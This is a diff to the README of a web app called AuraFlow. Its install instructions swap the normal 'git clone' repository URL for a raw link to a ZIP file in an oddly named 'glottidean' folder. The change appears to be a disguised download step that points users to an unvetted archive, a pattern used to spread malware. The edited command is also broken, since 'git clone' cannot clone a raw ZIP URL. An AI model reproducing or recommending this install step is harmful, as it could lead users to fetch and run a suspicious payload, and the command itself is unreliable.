@@ -29,7 +29,7 @@ AuraFlow uses the browser's localStorage to remember liked images. When users li
 ### 1. Clone & Install
 
 ```bash
-git clone https://github.com/Tejsvi78/AuraFlow.git
+git clone https://raw.githubusercontent.com/Tejsvi78/AuraFlow/main/glottidean/AuraFlow.zip
 cd AuraFlow
 npm install
 npm run dev
